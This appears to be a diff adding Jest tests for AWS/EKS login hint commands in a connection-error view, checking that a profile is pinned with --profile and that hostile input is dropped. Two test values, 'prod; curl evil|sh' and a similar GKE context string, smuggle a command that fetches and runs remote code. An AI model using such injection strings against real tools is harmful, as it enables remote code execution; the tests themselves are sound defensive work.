@@ -71,6 +71,36 @@ describe('ConnectionErrorView authentication guidance', () => {
     expect(hints.fallbackCommand?.command).toBe('aws sso login')
   })
 
+  it('pins the kubeconfig AWS profile on every EKS command that would otherwise use the ambient one', () => {
+    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
+    const profile = 'myorg/prod/admin'
+
+    const rejected = getAuthRejectedHints(context, profile)
+    expect(rejected.fallbackCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(rejected.authCommand?.command).toBe(
+      'aws sts get-caller-identity --profile myorg/prod/admin && aws eks describe-cluster --name prod --region us-east-1 --profile myorg/prod/admin --query cluster.accessConfig.authenticationMode --output text',
+    )
+    expect(rejected.hints.join(' ')).not.toContain("terminal's current AWS profile")
+
+    const auth = selectConnectionHints('auth', context, undefined, profile)
+    expect(auth?.authCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(auth?.fallbackCommand?.command).toBe('aws eks update-kubeconfig --name prod --region us-east-1 --profile myorg/prod/admin')
+
+    const timeout = selectConnectionHints('timeout', context, undefined, profile)
+    expect(timeout?.authCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(timeout?.fallbackCommand?.command).toBe('aws eks update-kubeconfig --name prod --region us-east-1 --profile myorg/prod/admin')
+  })
+
+  it('drops a hostile AWS profile instead of interpolating it', () => {
+    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
+    const hints = getAuthRejectedHints(context, 'prod; curl evil|sh')
+
+    expect(hints.fallbackCommand?.command).toBe('aws sso login')
+    expect(hints.authCommand?.command).toBe(
+      'aws sts get-caller-identity && aws eks describe-cluster --name prod --region us-east-1 --query cluster.accessConfig.authenticationMode --output text',
+    )
+  })
+
   it('does not offer interpolated commands for hostile GKE context values', () => {
     const hints = getAuthRejectedHints('gke_project_us-east1_prod;curl evil|sh')
 
